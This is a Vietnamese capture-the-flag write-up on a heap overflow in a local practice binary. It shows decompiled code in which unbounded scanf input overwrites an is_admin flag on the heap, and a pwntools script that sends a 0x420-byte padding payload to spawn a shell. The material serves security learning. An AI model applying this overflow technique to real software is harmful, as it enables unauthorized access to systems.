# Heap overflow 1

dee tiếp tục với seri học heap nào

**Lỗi đầu tiên cơ bản là về tràn bộ nhớ heap (Heap overflow ).** Khi ta có lỗi tràn bộ nhớ heap, ta có thể thay đổi các giá trị của các biến khác nằm bên dưới vùng mà ta có thể ghi đè để làm thay đổi cách chương trình hoạt động. Từ đó ta có thể khai thác và khiến chương trình chạy theo mong muốn.

## ida

```c 
ssize_t init()
{
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  fd = open("/dev/urandom", 0, 0LL);
  if ( fd < 0 )
    die("Failed to open urandom");
  username_check = malloc(0x200uLL);
  password_check = malloc(0x200uLL);
  username_input = malloc(0x200uLL);
  password_input = malloc(0x200uLL);
  is_admin = (__int64)malloc(0x10uLL);
  read(fd, username_check, 0x200uLL);
  return read(fd, password_check, 0x200uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts("******************************************");
  puts("*    Unauthorize access is forbidden!    *");
  puts("******************************************\n");
  printf("Username: ");
  __isoc99_scanf("%s", username_input);
  printf("Password: ");
  __isoc99_scanf("%s", password_input);
  if ( !memcmp(username_input, username_check, 0x200uLL) && !memcmp(password_input, password_check, 0x200uLL) )
    *(_DWORD *)is_admin = 1;
  if ( *(_DWORD *)is_admin == 1 )
  {
    puts("Access granted!");
    system("/bin/sh");
  }
  else
  {
    puts("Access forbidden!");
  }
  return 0;
}
```

đây là chall liên quan đến heap vì các giá trị khởi tạo và nhập vào trong địa chỉ heap

**2 biến username_input và password_input khởi tạo 0x200 byte nhưng mà cho phép ta nhập ko giới hạn số byte => lỗi heap overflow tại đây**

**username_check** và **password_check** thì khởi tạo random, ta không xác định được

## Khai thác

```c 
if ( !memcmp(username_input, username_check, 0x200uLL) && !memcmp(password_input, password_check, 0x200uLL) )
    *(_DWORD *)is_admin = 1;
  if ( *(_DWORD *)is_admin == 1 )
  {
    puts("Access granted!");
    system("/bin/sh");
  }
  else
  {
    puts("Access forbidden!");
  }
```

ở đây có ta đoán 2 có cách có thể lấy được shell

- **cách 1:**

đơn giản là ta làm **nhập cho username_input và password_input giống username_check và password_check là được**

vấn đề ở đây là username_check và password_check thì khởi tạo random, ta không xác định được, **nên ở thực thi cách này là ko khả thi** 

- **cách 2: Sử dụng kĩ thuật Heap Overflow**

ở đây ta hoàn toàn có thể Sử dụng **kĩ thuật Heap Overflow để thay đổi biến is_admin == 1** 

![image](https://github.com/gookoosss/CTF/assets/128712571/688d1890-5a81-4dbc-8770-3f31661560d7)


ta tính **offset từ username_input đến is_admin là 0x420**, sau đó ta sẽ **ghi đè cho is_admin bằng p64(0x1)**

còn password_input thì ta nhập đại thôi

cuối cùng thì ta lấy được shell

![image](https://github.com/gookoosss/CTF/assets/128712571/03d9750f-7ae4-441d-a1b7-86d167038360)


# script

```python 
from pwn import *

p = process('./hof1')

gdb.attach(p, gdbscript = '''
b*main+93
b*main+137
c
''')

input()

payload = b'a'*0x420 + p64(0x1)

p.sendlineafter(b'Username: ', payload)
p.sendlineafter(b'Password: ', b'a'*8)

p.interactive()
```


